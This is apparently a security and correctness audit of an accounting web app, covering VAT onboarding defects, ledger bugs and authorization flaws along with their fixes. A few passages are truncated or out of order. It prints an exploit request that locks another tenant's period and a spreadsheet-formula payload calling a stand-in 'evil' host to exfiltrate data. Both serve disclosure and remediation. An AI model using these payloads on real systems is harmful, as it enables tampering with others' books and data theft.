## Live-testing findings (2026-08-18) — hands-on CPA walkthrough on the deployed app

A CPA drove the deployed app through onboarding → sales → purchases and surfaced five
defects deeper than this audit assumed (the audit presumed Tax Setup was completed and
VAT defaulted; neither holds). Diagnosed against the live DB (client "Petron" had
`regime=null`, 0 tax codes, yet 14 posted entries; "Test Studios" was correctly set up).

- **T-01 — Onboarding lets an unconfigured client post VAT-free books.** `High/M`. Creating a
  client + seeding the COA does not set up tax; `seed_client_tax_codes` only runs from the Tax
  Setup card's "Run setup". The invoice form hides the VAT column entirely when the client has no
  VAT codes (`DocumentDialog.tsx:348 showTaxColumn = … && lineTaxCodes.length > 0`), and nothing
  stops document posting for a client with no tax profile → silent VAT-free books that look fine.
  *Fix (chosen):* a **guided setup wizard** on client creation (regime/taxpayer questionnaire →
  seed COA + tax codes + compliance in one flow) that blocks/warns document entry until complete.
  **Queued (next).**
- **T-02 — VAT never defaults on a document line.** `High/S` · confirmed. Each line defaulted to
  "No tax" (`tax_code_id: ''`), so a VAT-registered client's invoice posts VAT-free unless the
  preparer picks "Output VAT 12%" every line; no client/item/contact default.
  **✅ FIXED (2026-08-18)** — `DocumentDialog.tsx` now defaults a new line to the client's standard
  12% taxable output/input VAT code (`vat_class='taxable'`) for VAT-registered clients; empty for
  non-VAT clients and non-VAT doc types.
- **T-03 — Cash / account pickers include the non-postable parent header.** `Medium/S` · confirmed.
  `bankAccounts = accounts.filter(a => a.code.startsWith('1000'))` swept in the `1000`
  "Cash and cash equivalents" summary account (the erroneous "mother account" in *Where the money
  moved*), and header accounts could reach the line picker too. **✅ FIXED (2026-08-18)** —
  `DocumentDialog.tsx` computes `headerAccountIds` (an account that owns children via `parent_id`
  or a `${code}-NN` code) and excludes them from both the cash picker and the line-account picker.
- **T-04 — Receipts/disbursements have no gross VAT/WT breakdown.** `High/M`. The collection/payment
  form assumes AR/AP is already net of VAT and offers no Net + VAT + WT decomposition, so a
  VAT-inclusive receivable and its CWT-on-net can't be captured correctly. **Queued.**
- **T-05 — Compliance calendar is retroactive; tax status isn't effective-dated.** `Medium/M`. A
  client added today shows back-dated "missed" deadlines, and there's no VAT-registration date,
  EWT-applicability date, or questionnaire to model a taxpayer becoming VAT/EWT-liable mid-year.
  **Queued (design).**

## Executive summary

Larkspur is a genuinely well-built product: a strict double-entry engine whose GL
**cannot be driven out of balance** (every posting funnels through one trigger that
checks `sum(debit)=sum(credit)` exactly, in `numeric`, no float, no tolerance), a
default-closed two-wall (grants + RLS) tenancy model whose **read-side isolation holds
across all 33 tables**, immutable posted records, and a FIFO inventory engine whose
`valuation == GL 1200` invariant holds by construction. The security perimeter is
strong: no service-role key anywhere, no dynamic SQL, every SECURITY DEFINER function
pins `search_path=''`, composite FKs make cross-tenant references unrepresentable, and
column-level grants enforce immutability.

The audit's leverage is therefore **not** "find the stubs" but three things:

1. **One real cross-tenant security bug** — a NULL-role fail-open lets a non-member
   (notably a *removed* staffer) irreversibly lock another tenant's period (`P4-01`).
2. **A cluster of correctness defects around the seams** the balance-trigger doesn't
   cover: manual JEs into control accounts (`P3-02`), a save→issue retry double-post
   (`P3-01`), unvalidated withholding base (`P3-03`), UTC-vs-Manila dashboards
   (`P3-04`), a FIFO sub-centavo failure (`P3-06`), and a trial balance that can stop
   tying (`P3-07`).
3. **A daily-loop UX gap** vs. the competitor (modal-per-document capture ≈ 3–5× the
   interaction cost of their grid) and a **filing last-mile gap** (no XML/DAT/SLSP).

Nothing in Phase 4 exposes another tenant's books to a passive reader. The one leak
(`P4-06`) discloses a config constant, not data.

# PHASE 3 — CORRECTNESS (accounting integrity)

**The core holds.** `assert_entry_postable` sums debits/credits as `numeric(18,2)` and
compares them **exactly** (no float, no tolerance); every draft/submitted→posted
transition funnels through the `post_entry` UPDATE that fires it, so the ledger cannot
post out of balance through any path. All six `issue_document` leg builders balance by
construction. Posted-record immutability (jsonb-diff carve-out for `reversed_by` only)
and the one-way lock are sound. The FIFO `valuation == GL 1200` invariant holds — except
via P3-02. (verified first-hand)

### Confirmed — High

**P3-01 — Save→issue/post retry double-posts money; every failed issue orphans a draft.**
`Blocker/M` · **(verified first-hand)** · `DocumentDialog.tsx:434-450`, `EntryDialog.tsx:195-212`,
`documents/api.ts:93-99`.
`save.mutate({ documentId: doc?.id ?? null })` never writes the server-created id back to
state, and `onClose()` fires only on the success branch. After a failed issue the dialog
stays open with `doc` still null, so the next click inserts a **second** draft and issues
it. If the first `issue_document` actually committed but the response was lost, this
re-posts the same revenue + output VAT + a second FIFO stock draw (double sales). Even
without a lost response, every issue-failure retry accumulates an orphan draft that can
later be issued into the books.
*Fix:* capture the returned id into state after save (so retry updates, not inserts), or
make save+issue one server RPC / idempotency token.

**P3-02 — Manual JEs bypass the control-account guard → subledgers desync from the GL.**
`High/M` · confirmed **(corroborated ×2)** · `journal.sql:214-232`, `practice.sql:184-219`,
`inventory.sql:193`, `EntryDialog.tsx:78,274`.
`app.assert_lines_avoid_control` (rejects lines on 1100/2000/1200/tax accounts) runs
**only** inside `issue_document`. `post_entry` and `assert_entry_postable` check
balance/period/archived-account only — no account restriction — and the manual-JE grid
offers every active account. A balanced `DR 1200 / CR 3000` posts, moving GL 1200 while
`inventory_valuation` (sum of layer residuals) is unchanged → the "valuation == 1200"
invariant is false; likewise 1100/2000 vs `open_items`. Every *other* path is hardened;
the manual JE is the one hole. (`bank_categorize` also blocks 1100/2000/1200 but **not**
1310/2200, a narrower variant.)
*Fix:* run `assert_lines_avoid_control` from a `journal_lines` trigger (or inside
`post_entry`) so it binds on every posting path.
**✅ FIXED (2026-08-14, Phase 3)** — `migration 20260814000600`: (1) stock adjustments now tag their
entry `source_type='inventory_adjustment'` (new CHECK value), so (2) `assert_entry_postable` — which
fires on EVERY posting path via `post_entry` — can reject a `source_type='manual'` entry that touches
any control account (1100/2000/1200 or a tax account) while leaving engine docs, reversals, opening
balances, bank imports, and stock adjustments free to post their own control legs; (3) `bank_categorize`
now also blocks tax control accounts (the narrower variant). Test: `022_phase3_control_accounts.sql`
(manual JE to AR rejected; normal manual JE still posts) — fails 1/2 on pre-fix code.

**P3-03 — Withholding base is user-typed and never validated against the applied amount.**
`High/S` · confirmed **(verified first-hand)** `[single-pass verifier]` · `practice.sql:310,500,570`,
`…001600_tax.sql:183`, `DocumentDialog.tsx:308,312`.
`v_wht_amt := round(wht_base * rate, 2)` from a base whose only constraint is
`wht_base > 0`. Nothing ties it to the invoice/bill net or the applications; the only
runtime guards bound the computed *tax* (`< applied`), never the base. A wrong base
simultaneously corrupts recorded cash (`applied − wht`), the CWT/EWT asset/liability, the
2307 base/tax snapshot, the 0619-E/1601-EQ figures, and the income-tax credit — while the
entry stays balanced. *Fix:* derive/validate the base from the applied documents' frozen
`document_taxes` (net-of-VAT). *Assumption:* PH withholding = ATC rate × income payment
net of VAT.

**P3-04 — Dashboards decide business dates with server `current_date` (UTC).**
`High/M` · confirmed **(verified first-hand)** `[single-pass verifier]` ·
`…001800_inventory.sql:942,952,960,964`, `practice.sql:1109,1116,1122,1125`.
No `SET timezone` anywhere → the DB session is UTC while business dates are Asia/Manila
(UTC+8). From Manila 00:00–08:00 (and at month/year rollovers) `current_date` is still the
previous day/month/year, so `client_dashboard`/`practice_dashboard` MTD windows, the AR/AP
as-of (hence overdue counts), the "this period" lookup, and the compliance year union are
all off. *Fix:* pass a Manila "today" explicitly, or `SET timezone='Asia/Manila'` for these
functions. *Assumption:* the hosted DB session TZ is the UTC default (confirmed no override
in migrations).

**P3-05 — `reverse_entry` TOCTOU double-reversal → GL off by one full reversal.**
`High/S` (Medium if concurrency is rare) · confirmed **(corroborated ×2)** ·
`journal.sql:285,294,312-314`.
`reverse_entry` reads `reversed_by`, checks it is null, then builds+posts the mirror and
only afterwards sets `reversed_by` **unconditionally** (no `and reversed_by is null`, no
row-count check, no advisory lock — the only lock is inside `post_entry`, taken later). Two
concurrent calls (double-click / two tabs / retry) both pass the null check and both post,
leaving the ledger with A + R1 + R2 = **−A** and the original flagged reversed. `void_document`
is safe (it holds doc lock key 2); the raw RPC is not. *Fix:* `update … where id=p and
reversed_by is null` with a row-count guard, or take the advisory lock before the check.
**✅ FIXED (2026-08-14, Phase 3)** — `migration 20260814000300` now takes the client's posting
advisory lock (same key as `post_entry`) BEFORE the check, re-reads `reversed_by` under the lock,
and makes the final flag-write conditional (`where reversed_by is null` + `if not found` guard).
Test: `019_phase3_accounting.sql` proves single-threaded correctness — a reversal cancels the
original in the GL (Rent and Cash both net to zero) and a second reversal is rejected. **Scope
note:** a single-connection pgTAP suite cannot reproduce the actual race; the race fix relies on
the advisory-lock serialization the codebase already uses for `post_entry`/`void_document`, and
the full suite (incl. void/reversal paths) still passes, confirming no regression.

### Confirmed — Medium

**P3-06 — FIFO sub-centavo overshoot: over-stated COGS, negative valuation with stock on
hand, and an in-stock item that can't be sold.** `Medium/M` (borderline High) · confirmed
**(corroborated ×2, verified first-hand)** · `inventory.sql:260-267,119,1105`.
`consume_fifo` prices a partial take as `round(v_take*unit_cost,2)` but the *exhausting*
take as the residual `cost_total − Σ(prior consumptions)`, floored by
`check (cost >= 0)`. The residual only claws back **under**-rounded partials; when
`unit_cost` has a fractional centavo that rounds **up** (e.g. 100 units @ ₱0.50 →
`unit_cost=0.005`, each single-unit sale → ₱0.01), cumulative COGS passes `cost_total`
mid-layer (valuation and GL 1200 go **negative** with units on hand) and the exhausting
sale computes a negative cost → constraint violation → **the last in-stock unit cannot be
sold**. Common for cheap bulk goods sold individually. Same path used by negative
adjustments. *Fix:* clamp the exhausting residual at 0 and carry the overage, or price all
takes proportionally with a final true-up that can be negative-safe.

counterparties → the TB can stop tying and disagree with the Balance Sheet.**
`Medium/S` · confirmed **(verified first-hand)** · `journal.sql:361-362`.
`trial_balance` filters `where a.archived_at is null`; `balance_sheet`/`profit_and_loss`
do not. Archiving an account that already has postings is permitted (`archived_at` freely

`total_debit ≠ total_credit` and the TB disagrees with the BS. *Fix:* include archived
accounts that have in-range movements (or block archiving a non-zero-balance account —
ties to P4-13).
**✅ FIXED (2026-08-14, Phase 3)** — `migration 20260814000400` keeps an account in the TB when it

# PHASE 4 — SECURITY (RLS is the entire perimeter)

**Threat model:** a hostile authenticated user with a valid login + the public anon key,
making raw PostgREST/RPC/storage calls (not the UI).

**Sound, verified explicitly (the safe surface):** read-side isolation across all 33
tables (every SELECT policy derives from `accessible_client_ids()` / `can_read_firm_client()`
/ `is_firm_admin()` / `shares_firm_with()`, never a client value); all 22 report RPCs are
SECURITY INVOKER (a foreign `client_id` yields zero rows); composite client/firm-anchored
FKs make cross-tenant references unrepresentable (embedding can't cross tenants);
column-level grants enforce immutability (`status`/`entry_no`/`doc_no`/`firm_id`/
`functional_currency`/`role` all ungranted → no raw PATCH); draft-gated child writes +
immutability triggers (two walls, no TOCTOU); **no PUBLIC-executable SECURITY DEFINER
function**; every SECURITY DEFINER function pins `search_path=''`; **no dynamic SQL**
anywhere (SQL injection unreachable); **no service-role key / RLS-bypass secret** in repo,
CI, tests, or config (anon key is the only key, injected as a repo *variable*); membership
RPCs (`add/update/remove_member`, `set_client_assignments`, `create_firm`) re-derive the
firm from the row and gate on `is_firm_admin` under an advisory lock, double-walled by
constraint triggers; **approval gate is un-bypassable** (`post_entry` is the sole chokepoint;
`require_approval` is admin-only via RLS despite the column grant); **last-admin** invariant
and **client_viewer** confinement hold; **default-closed** assignments hold (unassigned staff
see nothing); PKCE carries no token-in-URL; storage **fails closed**.

### Confirmed — High

**P4-01 — Period RPCs fail open on a NULL role → a non-member can irreversibly lock any
tenant's period.** `High/S` · confirmed **(corroborated ×2, verified first-hand)** ·
`periods.sql:61-69,81,96,112`.
`app.period_role_for_change(client)` returns `m.role` via a join on `user_id = auth.uid()`;
a caller with **no membership** in the client's firm gets **NULL**. The guards are
`if v_role not in ('firm_admin','reviewer')` (close/reopen) and `if v_role <> 'firm_admin'`
(lock). `NULL not in (…)` and `NULL <> …` both evaluate to **NULL**, which a PL/pgSQL `IF`
treats as false → the `raise 'not authorized'` is skipped → the SECURITY DEFINER `UPDATE`
runs, bypassing RLS.
*Exploit:* `POST /rpc/lock_period {"p_period_id":"<victim closed-period uuid>"}` from any
authenticated account with no membership in the victim firm → the period is locked, and
**locked is one-way**, permanently blocking the victim from posting or correcting it.
`close_period` (blocks all posting) and `reopen_period` work the same way. The `period_id`
is obtainable via the **removed-member vector**: a former staffer/viewer read the firm's
period UUIDs while a member, `remove_member` hard-deletes their membership, and they replay
a remembered UUID — defeating the "hard delete = clean revocation" intent. (Same-firm
wrong-role callers get a non-NULL role and are correctly rejected — the bug is strictly the
NULL/non-member path.)
*Fix:* `if v_role is distinct from 'firm_admin' and v_role is distinct from 'reviewer'…`
(and `is distinct from 'firm_admin'` for lock), or better, authorize with the NULL-safe
boolean `app.can_write_client(v_client)` / `app.is_firm_admin` used everywhere else (also
closes P4-05). The NULL-safe pattern already exists at `memberships.sql:87`.
**✅ FIXED (2026-08-14, Phase 1)** — `migration 20260814000100_phase1_period_and_rate_authz.sql`
makes the three period RPCs reject a NULL role with `is distinct from` (role policy
unchanged: close/reopen = admin or reviewer, lock = admin, staff/viewer excluded). Regression:
`supabase/tests/017_phase1_isolation.sql` (non-member and no-membership accounts cannot
lock/close/reopen another firm's period; the period is unchanged after a blocked attack). The
suite fails 9/12 on the pre-fix code and passes 12/12 after.

### Confirmed — Medium

**P4-02 — `secure_password_change=false` → any stolen/hijacked session sets a new password
with no reauth and no notification (silent, persistent takeover).** `Medium/S` · confirmed ·
`config.toml:228`, `src/auth/api.ts:27-30`, `UpdatePasswordPage.tsx:11-51`.
`updateUser({password})` requires only a valid session — no current-password, no recent-login
check — and the `password_changed` notification template is commented out. An attacker with a
live token (XSS-exfiltrated from `localStorage`, or a shared device) resets the password,
gaining persistent access that survives refresh-token rotation and the victim's logout, while
the victim is locked out silently. *Fix:* `secure_password_change=true` + enable the
password-changed notification; gate `/update-password` on a `PASSWORD_RECOVERY`-origin session.

**P4-03 — `numeric(18,2)` aggregate overflow permanently breaks every report RPC (insider
DoS, non-self-recoverable).** `Medium/L` · confirmed · `reports.sql:179,212,225,269,297,338`,
`journal.sql:350`, `hardening.sql:66,114`.
The posting gate caps a *single* entry at `numeric(18,2)` (~1e16) but **cumulative** sums are
unbounded; every report re-casts `SUM(...)::numeric(18,2)`. A writer posts two balanced
entries of ~1e16 each on one account; now `trial_balance`, `balance_sheet`, `general_ledger`,
`profit_and_loss`, `cash_flow_indirect`, `client_dashboard`, and the sales/purchases books
raise `22003 numeric field overflow` and return nothing — for *every* user of that client.
Because posted lines are immutable (triggers block delete even in definer context), it is
**not self-recoverable** (needs a DBA). *Fix:* widen report aggregates to `numeric(38,2)`
(don't down-cast the SUM) and/or add a sane per-line amount CHECK.

**✅ FIXED (2026-08-14, Phase 2)** — `src/lib/csv.ts` now routes every export cell through
`csvCell()`, which prefixes a `'` on any cell whose first char is `= + - @ TAB CR` while leaving
genuine numbers (typed numbers and numeric strings like `-1234.50`) untouched, then RFC-4180-quotes.
Test: `node --experimental-strip-types scripts/test-csv-injection.ts` prints PASS/FAIL (10 cases:
attacks neutralized, negative amounts preserved). XLSX writes type-`s` inline strings, which Excel
never evaluates, so that path was already safe (left as-is).

**P4-04 — Stored CSV / spreadsheet-formula injection via unsanitized text in exports.**
`Medium/S` · confirmed · `src/lib/csv.ts:45-58`, `src/lib/exports.ts:18-34`.
`downloadCsv`'s escaping quotes only `"`, `,`, `\n` — it does not neutralize a leading
`=`, `+`, `-`, `@`, TAB, or CR. A staff user sets a contact name to
`=WEBSERVICE("http://evil/x?d="&A2)` (or a DDE payload); when a firm admin exports the sales
book / contacts / GL and opens it in Excel or Sheets, the formula executes on the admin's
machine (exfiltration / command exec). XLSX writes inline strings so it is lower-risk but
still unsanitized. *Fix:* prefix any cell starting with `= + - @ \t \r` with a `'` (or a space).
